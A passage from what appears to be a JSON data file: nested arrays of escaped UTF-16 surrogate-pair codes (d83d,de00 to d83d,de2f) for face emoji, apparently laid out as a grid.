&quot;d83d,de23&quot;, &quot;d83d,de18&quot;, &quot;d83d,de19&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de08&quot;, &quot;d83d,de16&quot;, &quot;d83d,de11&quot;, &quot;d83d,de20&quot;, &quot;d83d,de11&quot;, &quot;d83d,de1b&quot; ], [ &quot;d83d,de24&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de13&quot;, &quot;d83d,de23&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de16&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de14&quot;, &quot;d83d,de14&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de19&quot;, &quot;d83d,de22&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de03&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de12&quot;, &quot;d83d,de23&quot;, &quot;d83d,de16&quot;, &quot;d83d,de10&quot;, &quot;d83d,de22&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de25&quot;, &quot;d83d,de24&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de28&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de15&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de02&quot;, &quot;d83d,de15&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de02&quot;, &quot;d83d,de06&quot;, &quot;d83d,de22&quot;, &quot;d83d,de23&quot;, &quot;d83d,de02&quot;, &quot;d83d,de15&quot;, &quot;d83d,de21&quot;, &quot;d83d,de13&quot;, &quot;d83d,de26&quot;, &quot;d83d,de00&quot;, &quot;d83d,de2c&quot; ], [ &quot;d83d,de27&quot;, &quot;d83d,de04&quot;, &quot;d83d,de13&quot;, &quot;d83d,de04&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de09&quot;, &quot;d83d,de11&quot;, &quot;d83d,de22&quot;, &quot;d83d,de13&quot;, &quot;d83d,de11&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de23&quot;, &quot;d83d,de19&quot;, &quot;d83d,de21&quot;, &quot;d83d,de27&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de18&quot;, &quot;d83d,de25&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de22&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de15&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de17&quot;, &quot;d83d,de16&quot;, &quot;d83d,de06&quot;, &quot;d83d,de00&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de21&quot;, &quot;d83d,de10&quot;, &quot;d83d,de04&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de25&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de07&quot;, &quot;d83d,de18&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de02&quot;, &quot;d83d,de12&quot;, &quot;d83d,de18&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de21&quot; ], [ &quot;d83d,de12&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de08&quot;, &quot;d83d,de29&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de00&quot;, &quot;d83d,de12&quot;, &quot;d83d,de27&quot;, &quot;d83d,de21&quot;, &quot;d83d,de11&quot;, &quot;d83d,de17&quot;, &quot;d83d,de20&quot;, &quot;d83d,de27&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de01&quot;, &quot;d83d,de25&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de02&quot;, &quot;d83d,de16&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de24&quot;, &quot;d83d,de23&quot;, &quot;d83d,de13&quot;, &quot;d83d,de14&quot;, &quot;d83d,de27&quot;, &quot;d83d,de03&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de27&quot;, &quot;d83d,de03&quot;, &quot;d83d,de22&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de07&quot;, &quot;d83d,de09&quot;, &quot;d83d,de23&quot;, &quot;d83d,de01&quot;, &quot;d83d,de10&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de19&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de00&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de10&quot;, &quot;d83d,de0d&quot; ], [ &quot;d83d,de25&quot;, &quot;d83d,de15&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de00&quot;, &quot;d83d,de21&quot;, &quot;d83d,de03&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de26&quot;, &quot;d83d,de17&quot;, &quot;d83d,de14&quot;, &quot;d83d,de10&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de29&quot;, &quot;d83d,de24&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de12&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de10&quot;, &quot;d83d,de09&quot;, &quot;d83d,de23&quot;, &quot;d83d,de26&quot;, &quot;d83d,de13&quot;, &quot;d83d,de13&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de21&quot;, &quot;d83d,de25&quot;, &quot;d83d,de01&quot;, &quot;d83d,de24&quot;, &quot;d83d,de07&quot;, &quot;d83d,de27&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de24&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de24&quot;, &quot;d83d,de21&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de21&quot;, &quot;d83d,de26&quot;, &quot;d83d,de24&quot;, &quot;d83d,de23&quot;, &quot;d83d,de0f&quot; ], [ &quot;d83d,de27&quot;, &quot;d83d,de11&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de17&quot;, &quot;d83d,de14&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de20&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de26&quot;, &quot;d83d,de21&quot;, &quot;d83d,de06&quot;, &quot;d83d,de10&quot;, &quot;d83d,de17&quot;, &quot;d83d,de23&quot;, &quot;d83d,de23&quot;, &quot;d83d,de25&quot;, &quot;d83d,de10&quot;, &quot;d83d,de17&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de22&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de27&quot;, &quot;d83d,de08&quot;, &quot;d83d,de08&quot;, &quot;d83d,de03&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de16&quot;, &quot;d83d,de09&quot;, &quot;d83d,de18&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de13&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de08&quot;, &quot;d83d,de22&quot;, &quot;d83d,de02&quot;, &quot;d83d,de12&quot;, &quot;d83d,de11&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de10&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de12&quot;, &quot;d83d,de18&quot;, &quot;d83d,de28&quot;, &quot;d83d,de0b&quot; ], [ &quot;d83d,de00&quot;, &quot;d83d,de24&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de13&quot;, &quot;d83d,de12&quot;, &quot;d83d,de16&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de24&quot;, &quot;d83d,de25&quot;, &quot;d83d,de04&quot;, &quot;d83d,de05&quot;, &quot;d83d,de04&quot;, &quot;d83d,de11&quot;, &quot;d83d,de22&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de19&quot;, &quot;d83d,de21&quot;, &quot;d83d,de02&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de25&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de10&quot;, &quot;d83d,de22&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de12&quot;, &quot;d83d,de09&quot;, &quot;d83d,de05&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de03&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de18&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de07&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de20&quot;, &quot;d83d,de03&quot;, &quot;d83d,de17&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de05&quot;, &quot;d83d,de23&quot;, &quot;d83d,de14&quot;, &quot;d83d,de17&quot;, &quot;d83d,de01&quot;, &quot;d83d,de16&quot; ], [ &quot;d83d,de12&quot;, &quot;d83d,de16&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de21&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de20&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de28&quot;, &quot;d83d,de27&quot;, &quot;d83d,de15&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de22&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de02&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de25&quot;, &quot;d83d,de26&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de17&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de21&quot;, &quot;d83d,de17&quot;, &quot;d83d,de19&quot;, &quot;d83d,de16&quot;, &quot;d83d,de04&quot;, &quot;d83d,de29&quot;, &quot;d83d,de05&quot;, &quot;d83d,de00&quot;, &quot;d83d,de19&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de24&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de24&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de13&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de03&quot;, &quot;d83d,de28&quot;, &quot;d83d,de29&quot;, &quot;d83d,de08&quot; ], [ &quot;d83d,de19&quot;, &quot;d83d,de09&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de19&quot;, &quot;d83d,de28&quot;, &quot;d83d,de13&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de02&quot;, &quot;d83d,de23&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de05&quot;, &quot;d83d,de00&quot;, &quot;d83d,de10&quot;, &quot;d83d,de19&quot;, &quot;d83d,de26&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de26&quot;, &quot;d83d,de26&quot;, &quot;d83d,de06&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de06&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de02&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de03&quot;, &quot;d83d,de01&quot;, &quot;d83d,de04&quot;, &quot;d83d,de19&quot;, &quot;d83d,de21&quot;, &quot;d83d,de07&quot;, &quot;d83d,de06&quot;, &quot;d83d,de21&quot;, &quot;d83d,de15&quot;, &quot;d83d,de18&quot;, &quot;d83d,de15&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de18&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de20&quot;, &quot;d83d,de06&quot; ], [ &quot;d83d,de13&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de07&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de27&quot;, &quot;d83d,de17&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de17&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de08&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de00&quot;, &quot;d83d,de12&quot;, &quot;d83d,de15&quot;, &quot;d83d,de12&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de06&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de29&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de05&quot;, &quot;d83d,de20&quot;, &quot;d83d,de03&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de23&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de02&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de00&quot;, &quot;d83d,de19&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de10&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de12&quot;, &quot;d83d,de19&quot;, &quot;d83d,de18&quot;, &quot;d83d,de19&quot;, &quot;d83d,de08&quot;, &quot;d83d,de09&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de01&quot; ], [ &quot;d83d,de12&quot;, &quot;d83d,de00&quot;, &quot;d83d,de03&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de21&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de28&quot;, &quot;d83d,de12&quot;, &quot;d83d,de05&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de22&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de25&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de28&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de26&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de18&quot;, &quot;d83d,de16&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de01&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de09&quot;, &quot;d83d,de28&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de13&quot;, &quot;d83d,de17&quot;, &quot;d83d,de04&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de07&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de06&quot;, &quot;d83d,de08&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de0f&quot; ], [ &quot;d83d,de1e&quot;, &quot;d83d,de15&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de01&quot;, &quot;d83d,de08&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de14&quot;, &quot;d83d,de04&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de23&quot;, &quot;d83d,de13&quot;, &quot;d83d,de00&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de29&quot;, &quot;d83d,de15&quot;, &quot;d83d,de08&quot;, &quot;d83d,de25&quot;, &quot;d83d,de17&quot;, &quot;d83d,de26&quot;, &quot;d83d,de15&quot;, &quot;d83d,de22&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de00&quot;, &quot;d83d,de07&quot;, &quot;d83d,de05&quot;, &quot;d83d,de03&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de07&quot;, &quot;d83d,de10&quot;, &quot;d83d,de25&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de11&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de00&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de23&quot;, &quot;d83d,de01&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de21&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de07&quot;, &quot;d83d,de08&quot; ], [ &quot;d83d,de19&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de13&quot;, &quot;d83d,de12&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de15&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de08&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de04&quot;, &quot;d83d,de04&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de22&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de14&quot;, &quot;d83d,de17&quot;, &quot;d83d,de22&quot;, &quot;d83d,de25&quot;, &quot;d83d,de09&quot;, &quot;d83d,de18&quot;, &quot;d83d,de16&quot;, &quot;d83d,de26&quot;, &quot;d83d,de02&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de21&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de13&quot;, &quot;d83d,de14&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de15&quot;, &quot;d83d,de26&quot;, &quot;d83d,de17&quot;, &quot;d83d,de03&quot;, &quot;d83d,de01&quot;, &quot;d83d,de20&quot;, &quot;d83d,de06&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de1c&quot; ], [ &quot;d83d,de04&quot;, &quot;d83d,de23&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de12&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de08&quot;, &quot;d83d,de20&quot;, &quot;d83d,de11&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de07&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de02&quot;, &quot;d83d,de16&quot;, &quot;d83d,de10&quot;, &quot;d83d,de12&quot;, &quot;d83d,de05&quot;, &quot;d83d,de05&quot;, &quot;d83d,de14&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de02&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de18&quot;, &quot;d83d,de24&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de01&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de29&quot;, &quot;d83d,de06&quot;, &quot;d83d,de08&quot;, &quot;d83d,de26&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de16&quot;, &quot;d83d,de18&quot;, &quot;d83d,de05&quot;, &quot;d83d,de26&quot;, &quot;d83d,de28&quot;, &quot;d83d,de24&quot;, &quot;d83d,de04&quot; ], [ &quot;d83d,de0e&quot;, &quot;d83d,de22&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de01&quot;, &quot;d83d,de26&quot;, &quot;d83d,de05&quot;, &quot;d83d,de27&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de19&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de25&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de26&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de11&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de08&quot;, &quot;d83d,de22&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de01&quot;, &quot;d83d,de13&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de16&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de21&quot;, &quot;d83d,de21&quot;, &quot;d83d,de21&quot;, &quot;d83d,de25&quot;, &quot;d83d,de24&quot;, &quot;d83d,de27&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de13&quot;, &quot;d83d,de09&quot;, &quot;d83d,de14&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de25&quot;, &quot;d83d,de26&quot;, &quot;d83d,de11&quot;, &quot;d83d,de22&quot;, &quot;d83d,de2d&quot; ], [ &quot;d83d,de08&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de01&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de23&quot;, &quot;d83d,de27&quot;, &quot;d83d,de06&quot;, &quot;d83d,de08&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de29&quot;, &quot;d83d,de16&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de15&quot;, &quot;d83d,de08&quot;, &quot;d83d,de15&quot;, &quot;d83d,de00&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de28&quot;, &quot;d83d,de06&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de29&quot;, &quot;d83d,de04&quot;, &quot;d83d,de18&quot;, &quot;d83d,de14&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de24&quot;, &quot;d83d,de01&quot;, &quot;d83d,de05&quot;, &quot;d83d,de07&quot;, &quot;d83d,de06&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de04&quot;, &quot;d83d,de23&quot;, &quot;d83d,de12&quot;, &quot;d83d,de15&quot;, &quot;d83d,de27&quot;, &quot;d83d,de06&quot;, &quot;d83d,de10&quot;, &quot;d83d,de22&quot;, &quot;d83d,de21&quot;, &quot;d83d,de02&quot;, &quot;d83d,de11&quot;, &quot;d83d,de0b&quot; ], [ &quot;d83d,de15&quot;, &quot;d83d,de28&quot;, &quot;d83d,de12&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de25&quot;, &quot;d83d,de28&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de06&quot;, &quot;d83d,de28&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de26&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de03&quot;, &quot;d83d,de18&quot;, &quot;d83d,de17&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de29&quot;, &quot;d83d,de01&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de03&quot;, &quot;d83d,de17&quot;, &quot;d83d,de28&quot;, &quot;d83d,de19&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de28&quot;, &quot;d83d,de07&quot;, &quot;d83d,de01&quot;, &quot;d83d,de19&quot;, &quot;d83d,de22&quot;, &quot;d83d,de06&quot;, &quot;d83d,de09&quot;, &quot;d83d,de04&quot;, &quot;d83d,de26&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de25&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de20&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de1a&quot; ], [ &quot;d83d,de03&quot;, &quot;d83d,de11&quot;, &quot;d83d,de26&quot;, &quot;d83d,de02&quot;, &quot;d83d,de06&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de25&quot;, &quot;d83d,de20&quot;, &quot;d83d,de03&quot;, &quot;d83d,de11&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de05&quot;, &quot;d83d,de10&quot;, &quot;d83d,de09&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de12&quot;, &quot;d83d,de01&quot;, &quot;d83d,de06&quot;, &quot;d83d,de09&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de19&quot;, &quot;d83d,de24&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de05&quot;, &quot;d83d,de22&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de17&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de17&quot;, &quot;d83d,de10&quot;, &quot;d83d,de20&quot;, &quot;d83d,de26&quot;, &quot;d83d,de05&quot;, &quot;d83d,de09&quot;, &quot;d83d,de25&quot;, &quot;d83d,de16&quot;, &quot;d83d,de17&quot;, &quot;d83d,de09&quot;, &quot;d83d,de24&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de18&quot; ], [ &quot;d83d,de13&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de09&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de27&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de13&quot;, &quot;d83d,de13&quot;, &quot;d83d,de19&quot;, &quot;d83d,de15&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de07&quot;, &quot;d83d,de14&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de08&quot;, &quot;d83d,de01&quot;, &quot;d83d,de15&quot;, &quot;d83d,de14&quot;, &quot;d83d,de20&quot;, &quot;d83d,de27&quot;, &quot;d83d,de24&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de23&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de29&quot;, &quot;d83d,de12&quot;, &quot;d83d,de21&quot;, &quot;d83d,de13&quot;, &quot;d83d,de10&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de07&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de03&quot;, &quot;d83d,de23&quot;, &quot;d83d,de29&quot;, &quot;d83d,de21&quot;, &quot;d83d,de12&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de23&quot;, &quot;d83d,de01&quot;, &quot;d83d,de11&quot; ], [ &quot;d83d,de27&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de00&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de12&quot;, &quot;d83d,de19&quot;, &quot;d83d,de11&quot;, &quot;d83d,de11&quot;, &quot;d83d,de23&quot;, &quot;d83d,de03&quot;, &quot;d83d,de26&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de09&quot;, &quot;d83d,de20&quot;, &quot;d83d,de02&quot;, &quot;d83d,de13&quot;, &quot;d83d,de10&quot;, &quot;d83d,de01&quot;, &quot;d83d,de27&quot;, &quot;d83d,de15&quot;, &quot;d83d,de03&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de04&quot;, &quot;d83d,de14&quot;, &quot;d83d,de02&quot;, &quot;d83d,de01&quot;, &quot;d83d,de15&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de00&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de14&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de15&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de16&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de24&quot; ], [ &quot;d83d,de03&quot;, &quot;d83d,de09&quot;, &quot;d83d,de15&quot;, &quot;d83d,de07&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de01&quot;, &quot;d83d,de20&quot;, &quot;d83d,de10&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de15&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de08&quot;, &quot;d83d,de22&quot;, &quot;d83d,de27&quot;, &quot;d83d,de05&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de20&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de22&quot;, &quot;d83d,de15&quot;, &quot;d83d,de29&quot;, &quot;d83d,de22&quot;, &quot;d83d,de27&quot;, &quot;d83d,de02&quot;, &quot;d83d,de26&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de04&quot;, &quot;d83d,de14&quot;, &quot;d83d,de06&quot;, &quot;d83d,de11&quot;, &quot;d83d,de18&quot;, &quot;d83d,de25&quot;, &quot;d83d,de17&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de14&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de2f&quot; ], [ &quot;d83d,de2e&quot;, 